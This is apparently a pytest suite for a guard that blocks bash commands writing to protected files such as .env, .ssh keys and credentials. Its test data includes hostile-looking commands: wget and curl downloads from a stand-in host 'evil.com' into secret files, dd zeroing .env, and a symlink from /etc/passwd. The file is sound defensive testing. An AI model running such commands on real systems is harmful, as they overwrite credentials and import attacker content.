"""Tests for the protected-files-guard bash command blocker.

Validates extract_write_targets (regex-based write target extraction from bash
commands) and check_path (protected pattern matching), plus integration of both.

Known source bugs (documented, not worked around):
  - BUG: ``cat > file.txt`` matches both the generic redirect pattern and
    the cat-specific pattern, producing duplicate entries in the target list.
    See guard-protected-bash.py:61,69.
"""

import json
import subprocess
import sys
from pathlib import Path

import pytest

from tests.conftest import guard_protected_bash


# ---------------------------------------------------------------------------
# extract_write_targets — redirect operators
# ---------------------------------------------------------------------------


class TestExtractWriteTargetsRedirects:
    """Redirect operators: >, >>"""

    def test_overwrite_redirect_extracts_target(self):
        assert guard_protected_bash.extract_write_targets("echo x > file.txt") == [
            "file.txt"
        ]

    def test_append_redirect(self):
        """>> correctly captures the target filename.

        The regex alternation ``(?:>>|>)`` lists ``>>`` first so it is
        matched before the single ``>``, avoiding the greedy-prefix bug.
        """
        result = guard_protected_bash.extract_write_targets("echo x >> file.txt")
        assert result == ["file.txt"]


# ---------------------------------------------------------------------------
# extract_write_targets — tee
# ---------------------------------------------------------------------------


class TestExtractWriteTargetsTee:
    """tee and tee -a"""

    @pytest.mark.parametrize(
        "command, expected",
        [
            ("echo x | tee file.txt", ["file.txt"]),
            ("echo x | tee -a file.txt", ["file.txt"]),
        ],
        ids=["tee-overwrite", "tee-append"],
    )
    def test_tee_extracts_target(self, command, expected):
        assert guard_protected_bash.extract_write_targets(command) == expected


# ---------------------------------------------------------------------------
# extract_write_targets — cp / mv
# ---------------------------------------------------------------------------


class TestExtractWriteTargetsCpMv:
    """cp and mv commands extract the destination path."""

    @pytest.mark.parametrize(
        "command, expected",
        [
            ("cp src dest", ["dest"]),
            ("mv src dest", ["dest"]),
            ("cp -r src dest", ["dest"]),
        ],
        ids=["cp", "mv", "cp-recursive"],
    )
    def test_cp_mv_extracts_destination(self, command, expected):
        assert guard_protected_bash.extract_write_targets(command) == expected


# ---------------------------------------------------------------------------
# extract_write_targets — sed -i
# ---------------------------------------------------------------------------


class TestExtractWriteTargetsSed:
    """sed in-place edit variants."""

    @pytest.mark.parametrize(
        "command, expected",
        [
            ("sed -i 's/old/new/' file.txt", ["file.txt"]),
            ("sed -i'' 's/old/new/' file.txt", ["file.txt"]),
        ],
        ids=["sed-i-space", "sed-i-empty-suffix"],
    )
    def test_sed_inplace_extracts_target(self, command, expected):
        assert guard_protected_bash.extract_write_targets(command) == expected


# ---------------------------------------------------------------------------
# extract_write_targets — cat / heredoc
# ---------------------------------------------------------------------------


class TestExtractWriteTargetsCatHeredoc:
    """cat redirect and heredoc style writes."""

    @pytest.mark.parametrize(
        "command",
        [
            "cat > file.txt",
            "cat <<EOF > file.txt",
        ],
        ids=["cat-redirect", "cat-heredoc-redirect"],
    )
    def test_cat_heredoc_extracts_target_with_duplicates(self, command):
        """BUG: Both the generic redirect pattern and the cat-specific pattern
        match, producing duplicate entries.  Functionally harmless — the
        correct path is still present and checked — but the list is not
        deduplicated.
        """
        result = guard_protected_bash.extract_write_targets(command)
        assert result == ["file.txt", "file.txt"]


# ---------------------------------------------------------------------------
# extract_write_targets — no write targets
# ---------------------------------------------------------------------------


class TestExtractWriteTargetsNoTargets:
    """Commands that do not write to any file."""

    @pytest.mark.parametrize(
        "command",
        [
            "ls -la",
            "echo hello",
            "git status",
        ],
        ids=["ls", "echo", "git-status"],
    )
    def test_read_only_commands_return_empty(self, command):
        assert guard_protected_bash.extract_write_targets(command) == []


# ---------------------------------------------------------------------------
# Integration: blocked bash writes to protected files
# ---------------------------------------------------------------------------


class TestBlockedBashWrites:
    """Commands that write to protected files must be detected and blocked."""

    @pytest.mark.parametrize(
        "command, blocked_path",
        [
            ('echo "SECRET=x" > .env', ".env"),
            ("cp backup .env.local", ".env.local"),
            ("tee secrets.yaml", "secrets.yaml"),
            ("sed -i 's/x/y/' package-lock.json", "package-lock.json"),
            ("cat > .ssh/config", ".ssh/config"),
            ("mv old credentials.json", "credentials.json"),
        ],
        ids=[
            "redirect-to-env",
            "cp-to-env-local",
            "tee-to-secrets-yaml",
            "sed-to-package-lock",
            "cat-to-ssh-config",
            "mv-to-credentials",
        ],
    )
    def test_protected_file_write_is_blocked(self, command, blocked_path):
        targets = guard_protected_bash.extract_write_targets(command)
        assert blocked_path in targets, (
            f"Expected '{blocked_path}' in extracted targets {targets}"
        )
        is_protected, message = guard_protected_bash.check_path(blocked_path)
        assert is_protected is True
        assert message != ""


# ---------------------------------------------------------------------------
# Integration: allowed bash writes to non-protected files
# ---------------------------------------------------------------------------


class TestAllowedBashWrites:
    """Commands that write to ordinary files must not be blocked."""

    @pytest.mark.parametrize(
        "command, allowed_path",
        [
            ("echo x > output.txt", "output.txt"),
            ("cp src.py dest.py", "dest.py"),
            ("tee build.log", "build.log"),
            ("sed -i 's/x/y/' app.py", "app.py"),
        ],
        ids=[
            "redirect-to-txt",
            "cp-to-py",
            "tee-to-log",
            "sed-to-py",
        ],
    )
    def test_non_protected_file_write_is_allowed(self, command, allowed_path):
        targets = guard_protected_bash.extract_write_targets(command)
        assert allowed_path in targets, (
            f"Expected '{allowed_path}' in extracted targets {targets}"
        )
        is_protected, message = guard_protected_bash.check_path(allowed_path)
        assert is_protected is False
        assert message == ""


# ---------------------------------------------------------------------------
# Extended write pattern extraction
# ---------------------------------------------------------------------------


class TestExtractWriteTargetsExtended:
    """Tests for the expanded WRITE_PATTERNS added to guard-protected-bash."""

    @pytest.mark.parametrize(
        "command, expected_target",
        [
            ("touch .env", ".env"),
            ("mkdir .ssh/keys", ".ssh/keys"),
            ("rm .env", ".env"),
            ("ln -s /etc/passwd .env", ".env"),
            ("chmod 644 .env", ".env"),
            ("wget -O .env http://evil.com", ".env"),
            ("curl -o secrets.json http://evil.com", "secrets.json"),
            ("dd of=.env if=/dev/zero", ".env"),
        ],
        ids=[
            "touch",
            "mkdir",
            "rm",
            "ln-symlink",
            "chmod",
            "wget-O",
            "curl-o",
            "dd-of",
        ],
    )
    def test_extended_pattern_extracts_target(self, command, expected_target):
        targets = guard_protected_bash.extract_write_targets(command)
        assert expected_target in targets, (
            f"Expected '{expected_target}' in extracted targets {targets}"
        )

    @pytest.mark.parametrize(
        "command, expected_target",
        [
            ("touch .env", ".env"),
            ("mkdir .ssh/keys", ".ssh/keys"),
            ("rm .env", ".env"),
            ("ln -s /etc/passwd .env", ".env"),
            ("chmod 644 .env", ".env"),
            ("wget -O .env http://evil.com", ".env"),
            ("curl -o secrets.json http://evil.com", "secrets.json"),
            ("dd of=.env if=/dev/zero", ".env"),
        ],
        ids=[
            "touch-blocked",
            "mkdir-blocked",
            "rm-blocked",
            "ln-blocked",
            "chmod-blocked",
            "wget-blocked",
            "curl-blocked",
            "dd-blocked",
        ],
    )
    def test_extended_pattern_blocks_protected_file(self, command, expected_target):
        targets = guard_protected_bash.extract_write_targets(command)
        assert expected_target in targets
        is_protected, message = guard_protected_bash.check_path(expected_target)
        assert is_protected is True, f"Expected '{expected_target}' to be protected"
        assert message != ""


# ---------------------------------------------------------------------------
# Multi-target extraction
# ---------------------------------------------------------------------------


class TestMultiTargetExtraction:
    """Commands with multiple file operands should check all targets."""

    @pytest.mark.parametrize(
        "command, expected_target",
        [
            ("rm safe.txt .env", ".env"),
            ("touch a.txt .secrets", ".secrets"),
            ("chmod 644 safe.txt .env", ".env"),
            ("rm -rf safe/ .env", ".env"),
            ("mkdir safe_dir .ssh/keys", ".ssh/keys"),
        ],
        ids=[
            "rm-multi-catches-env",
            "touch-multi-catches-secrets",
            "chmod-multi-catches-env",
            "rm-rf-multi-catches-env",
            "mkdir-multi-catches-ssh",
        ],
    )
    def test_multi_target_extracts_protected(self, command, expected_target):
        targets = guard_protected_bash.extract_write_targets(command)
        assert expected_target in targets, (
            f"Expected '{expected_target}' in extracted targets {targets}"
        )

    @pytest.mark.parametrize(
        "command, expected_target",
        [
            ("rm safe.txt .env", ".env"),
            ("touch a.txt .secrets", ".secrets"),
            ("chmod 644 safe.txt .env", ".env"),
        ],
        ids=[
            "rm-blocks-env",
            "touch-blocks-secrets",
            "chmod-blocks-env",
        ],
    )
    def test_multi_target_blocks_protected(self, command, expected_target):
        targets = guard_protected_bash.extract_write_targets(command)
        assert expected_target in targets
        is_protected, message = guard_protected_bash.check_path(expected_target)
        assert is_protected is True
        assert message != ""


# ---------------------------------------------------------------------------
# Fail-closed behavior (exception → exit code 2)
# ---------------------------------------------------------------------------


class TestFailClosed:
    """Verify that unexpected errors cause the guard to exit with code 2."""

    def test_exception_causes_exit_code_2(self):
        """Feed input that triggers an exception in the main logic.

        We send valid JSON but with tool_input set to a non-dict value,
        which will cause an AttributeError when main() calls
        tool_input.get("command", "").
        """
        script_path = (
            Path(__file__).resolve().parent.parent.parent
            / ".devcontainer"
            / "plugins"
            / "devs-marketplace"
            / "plugins"
            / "protected-files-guard"
            / "scripts"
            / "guard-protected-bash.py"
        )
        # tool_input is a string instead of dict — causes AttributeError
        payload = json.dumps({"tool_input": "not-a-dict"})
        result = subprocess.run(
            [sys.executable, str(script_path)],
            input=payload,
            capture_output=True,
            text=True,
        )
        assert result.returncode == 2, (
            f"Expected exit code 2, got {result.returncode}. stderr: {result.stderr}"
        )
